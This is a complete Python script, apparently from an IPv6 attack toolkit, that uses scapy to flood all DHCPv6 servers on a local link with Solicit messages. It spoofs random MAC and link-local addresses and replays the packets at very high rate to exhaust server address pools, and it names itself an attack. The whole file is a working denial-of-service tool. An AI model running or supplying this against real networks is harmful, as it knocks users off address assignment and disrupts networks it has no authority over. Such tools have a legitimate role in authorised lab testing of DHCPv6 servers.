#!/usr/bin/python3
import argparse
import random
import sys
import netifaces
from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6OptElapsedTime, DHCP6OptClientId, DUID_LLT, DHCP6OptIA_NA, \
    DHCP6OptRapidCommit
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendpfast

from validate_parameters import mac2ipv6


def main():
    parser = argparse.ArgumentParser(description="Flooding all active DHCP servers with DHCPv6 Solicit messages.")

    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-r", dest="rapid_commit", action="store_true", default=False,
                        help="activate the rapid commit for quick Reply from server")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Generate the packet
    print("Flooding all active DHCP servers with DHCPv6 Solicit messages (press Ctrl+C to stop the attack).....")
    pkt_list = []
    for i in range(1000):
        random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                  random.randint(0, 255),
                                                  random.randint(0, 255))
        layer2 = Ether(dst="33:33:00:01:00:02", src=random_mac, type=34525)

        random_ip = mac2ipv6(random_mac)
        layer3 = IPv6(dst="ff02::1:2", src=random_ip, hlim=1)

        layer4 = UDP(sport=546, dport=547)

        dhcpv6_solicit = DHCP6_Solicit(trid=random.randint(34525, 1710850))
        dhcpv6_OptElapsedTime = DHCP6OptElapsedTime()
        dhcpv6_OptClientId = DHCP6OptClientId(duid=
                                              DUID_LLT(timeval=random.randint(1027257600, 3327257600),
                                                       lladdr=random_mac))
        dhcpv6_OptIANA = DHCP6OptIA_NA(iaid=random.randint(123456789, 1735608832))

        packet1 = layer2 / layer3 / layer4 / dhcpv6_solicit
        if args.rapid_commit:
            packet1 /= DHCP6OptRapidCommit()
        packet1 /= dhcpv6_OptElapsedTime / dhcpv6_OptClientId / dhcpv6_OptIANA
        pkt_list.append(packet1)
    try:
        sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()
